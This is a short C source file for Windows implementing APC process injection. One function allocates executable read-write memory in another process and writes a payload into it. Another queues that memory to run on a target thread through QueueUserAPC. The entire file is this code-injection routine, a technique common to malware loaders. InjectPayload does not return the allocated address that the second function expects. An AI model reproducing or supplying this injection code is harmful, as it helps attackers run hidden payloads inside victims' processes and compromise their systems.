#include "PayloadInjection.h"
#include <windows.h>
#include <stdio.h>

BOOL InjectPayload(HANDLE hProcess, LPVOID lpPayload, SIZE_T payloadSize) {
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress == NULL) {
        printf("[!] VirtualAllocEx Failed with Error: %d\n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, lpBaseAddress, lpPayload, payloadSize, NULL)) {
        printf("[!] WriteProcessMemory Failed with Error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL QueuePayloadAPC(HANDLE hThread, LPVOID lpPayloadBase) {
    if (QueueUserAPC((PAPCFUNC)lpPayloadBase, hThread, NULL) == 0) {
        printf("[!] QueueUserAPC Failed with Error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
